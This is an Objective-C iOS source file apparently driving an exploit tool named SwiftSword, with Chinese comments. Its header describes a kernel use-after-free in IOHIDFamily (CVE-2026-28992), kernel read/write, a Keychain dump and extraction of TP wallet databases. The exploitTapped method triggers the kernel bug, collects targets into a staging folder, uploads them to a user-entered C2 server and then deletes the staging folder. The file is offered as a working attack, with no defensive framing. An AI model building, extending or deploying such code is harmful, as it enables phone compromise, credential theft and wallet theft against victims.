//
//  ViewController.m — SwiftSword 主控制器
//  阶段1: CVE-2026-28992 IOHIDFamily UAF 触发测试
//  阶段2: 内核 r/w 建立 + Keychain dump + TP walletdb 提取
//

#import "ViewController.h"
#import "Exploit/IOHIDFamilyUAF.h"
#import "Payload/collector.h"

@interface ViewController ()
@property (nonatomic, strong) UIButton *exploitBtn;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UITextField *c2Field;
@property (nonatomic, assign) BOOL running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    [self buildUI];
}

- (void)buildUI {
    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;

    UILabel *title = [[UILabel alloc] init];
    title.text = @"SwiftSword";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
    title.textColor = [UIColor whiteColor];
    title.textAlignment = NSTextAlignmentCenter;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *sub = [[UILabel alloc] init];
    sub.text = @"CVE-2026-28992 • A14 • iOS 26.2";
    sub.font = [UIFont fontWithName:@"Menlo" size:11];
    sub.textColor = [UIColor grayColor];
    sub.textAlignment = NSTextAlignmentCenter;
    sub.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:sub];

    // C2 URL input
    self.c2Field = [[UITextField alloc] init];
    self.c2Field.placeholder = @"C2 Server URL (optional)";
    self.c2Field.font = [UIFont fontWithName:@"Menlo" size:12];
    self.c2Field.textColor = [UIColor whiteColor];
    self.c2Field.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.c2Field.borderStyle = UITextBorderStyleRoundedRect;
    self.c2Field.autocapitalizationType = UITextAutocapitalizationTypeNone;
    self.c2Field.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.c2Field];

    // Exploit trigger button
    self.exploitBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.exploitBtn setTitle:@"EXPLOIT (UAF)" forState:UIControlStateNormal];
    self.exploitBtn.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    [self.exploitBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.exploitBtn.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.0 alpha:1];
    self.exploitBtn.layer.cornerRadius = 10;
    self.exploitBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [self.exploitBtn addTarget:self action:@selector(exploitTapped)
              forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.exploitBtn];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:13];
    self.statusLabel.textColor = [UIColor greenColor];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:10];
    self.logView.textColor = [UIColor greenColor];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.08 alpha:1];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 6;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:16],
        [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [sub.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:4],
        [sub.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.c2Field.topAnchor constraintEqualToAnchor:sub.bottomAnchor constant:12],
        [self.c2Field.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.c2Field.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.c2Field.heightAnchor constraintEqualToConstant:36],
        [self.exploitBtn.topAnchor constraintEqualToAnchor:self.c2Field.bottomAnchor constant:16],
        [self.exploitBtn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.exploitBtn.widthAnchor constraintEqualToConstant:220],
        [self.exploitBtn.heightAnchor constraintEqualToConstant:50],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.exploitBtn.bottomAnchor constant:12],
        [self.statusLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:8],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text
            stringByAppendingFormat:@"%@\n", msg];
        NSRange end = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:end];
    });
    // 同时写本地文件——panic 重启后可用爱思助手导出
    static dispatch_once_t once;
    static NSFileHandle *fh;
    dispatch_once(&once, ^{
        NSString *path = [NSTemporaryDirectory()
            stringByAppendingPathComponent:@"sword.log"];
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
        [fh seekToEndOfFile];
    });
    NSString *line = [msg stringByAppendingString:@"\n"];
    [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];  // 确保 panic 前刷盘
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)exploitTapped {
    if (self.running) return;
    self.running = YES;
    self.exploitBtn.enabled = NO;
    self.exploitBtn.backgroundColor = [UIColor grayColor];
    self.logView.text = @"";

    NSString *c2 = self.c2Field.text.length > 0
        ? self.c2Field.text : nil;

    [self log:@"=== SwiftSword CVE-2026-28992 ==="];
    [self log:[NSString stringWithFormat:@"Device: %@ iOS %@",
               [UIDevice currentDevice].name,
               [UIDevice currentDevice].systemVersion]];
    [self setStatus:@"Phase 1: UAF trigger..." color:[UIColor orangeColor]];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        // Phase 1: Trigger kernel UAF
        [self log:@"[Phase 1] Triggering IOHIDFamily UAF..."];
        [self log:@"  15 connections, 8 copyEvent threads, 200 attempts"];
        bool triggered = iohid_uaf_trigger();

        if (!triggered) {
            [self log:@"[Phase 1] No kernel panic — device may be patched or timing unlucky"];
            [self log:@"[*] Try again or run capture_logs.py to check state"];
            [self setStatus:@"Done (no panic — retry)" color:[UIColor yellowColor]];
            [self finishRun];
            return;
        }

        // Phase 2: If device rebooted, this code won't execute.
        // If we get here (pre-A17 data abort handled), kernel r/w may be available.
        [self log:@"[Phase 2] Post-exploit — attempting data collection..."];
        [self setStatus:@"Phase 2: Collection..." color:[UIColor orangeColor]];

        NSString *staging = [NSTemporaryDirectory()
            stringByAppendingPathComponent:@"ss_staging"];

        int collected = collector_run([staging UTF8String]);
        [self log:[NSString stringWithFormat:@"[Phase 2] Collected %d targets", collected]];

        if (c2) {
            [self log:[NSString stringWithFormat:@"[Phase 3] Uploading to %@...", c2]];
            bool ok = c2_upload([staging UTF8String], [c2 UTF8String]);
            [self log:[NSString stringWithFormat:@"[Phase 3] Upload %@", ok ? @"OK" : @"partial"]];
        }

        // Cleanup
        [[NSFileManager defaultManager] removeItemAtPath:staging error:nil];
        [self log:@"=== Complete ==="];
        [self setStatus:@"Done" color:[UIColor greenColor]];
        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.exploitBtn.enabled = YES;
        self.exploitBtn.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.0 alpha:1];
    });
}

@end
